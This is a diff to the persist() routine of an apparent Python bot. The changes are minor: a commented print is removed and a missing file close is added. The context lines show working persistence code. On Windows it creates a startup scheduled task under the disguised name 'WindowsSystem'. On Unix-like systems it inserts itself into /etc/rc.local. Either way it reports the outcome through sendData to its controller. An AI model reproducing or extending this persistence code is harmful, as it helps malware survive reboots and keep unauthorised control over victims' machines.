@@ -244,7 +244,6 @@ def persist(): #try to persist bot; for freebsd, make file, place in /usr/local/
 	pwd = os.getcwd()
 	if operatingSystem == "windows":
 		script = pwd + "\\" + argv[0]
-		# print "script is '%s'" % script
 		output = execute("schtasks /Create /SC ONSTART /TN WindowsSystem /TR " + script)
 		sendData(output)
 		return
@@ -275,6 +274,7 @@ def persist(): #try to persist bot; for freebsd, make file, place in /usr/local/
 				else:
 					outfile.write(line)
 
+			outfile.close()
 			sendData("Seems to have worked...")
 		else:
 			sendData("Either /etc/rc.local doesn't exist or I can't write to it.")
